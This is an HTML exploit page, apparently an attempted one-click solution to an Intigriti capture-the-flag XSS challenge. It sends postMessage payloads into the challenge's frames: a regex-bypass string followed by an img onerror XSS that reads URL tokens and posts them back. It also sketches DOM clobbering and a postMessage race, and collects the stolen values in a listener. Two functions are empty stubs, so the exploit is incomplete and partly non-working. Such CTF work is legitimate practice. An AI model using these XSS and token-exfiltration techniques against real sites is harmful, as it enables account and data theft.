<!DOCTYPE html>
<html>
<head>
    <title>Intigriti 1-Click Solve</title>
</head>
<body>
    <h1>Exploit Running...</h1>
    <button id="btn" onclick="launch()">Start</button>
    <script>
        let target = null;
        let stones = {};

        function launch() {
            // 1. Open the Challenge
            target = window.open('https://challenge-1225.intigriti.io/challenge#PerfectlyBalanced', 'target');
            
            // 2. Wait for load, then fire attacks
            setTimeout(exploitPowerRealitySoul, 2000); // Easy Stones
            setTimeout(hijackSpaceStone, 500);         // Race Condition
            setTimeout(clobberMindStone, 2500);        // DOM Clobbering
        }

        // A. Easy Stones: Regex Bypass XSS
        function exploitPowerRealitySoul() {
            [0, 1, 2].forEach(i => {
                try {
                    // Inject XSS to steal URL
                    let p = target.frames[i];
                    p.postMessage("A".repeat(2500) + "<", '*');
                    p.postMessage(`<img src=x onerror="window.top.opener.postMessage('STONE:${i}:'+location.search.match(/=[a-f0-9]{8}/)[0], '*')">`, '*');
                } catch(e) {}
            });
        }

        // B. Space Stone: PostMessage Capture
        function hijackSpaceStone() {
            // We race to add a listener before the message fires
            // Or we use XSS in Soul Stone to add a listener to the parent
        }

        // C. Mind Stone: DOM Clobbering
        function clobberMindStone() {
            let mind = target.frames[5];
            // Inject a clobbering payload. 
            // Example: Force a config variable to be an anchor tag
            let clobber = "&query=<a id=debug>true</a>"; 
            // This URL manipulation must happen during the initial load or navigation
        }

        // Listener to collect the loot
        window.addEventListener('message', e => {
            if (e.data.includes('STONE:')) console.log("Collected: " + e.data);
            // Once we have all 6 chunks -> Fire the alert
        });
    </script>
</body>
</html>
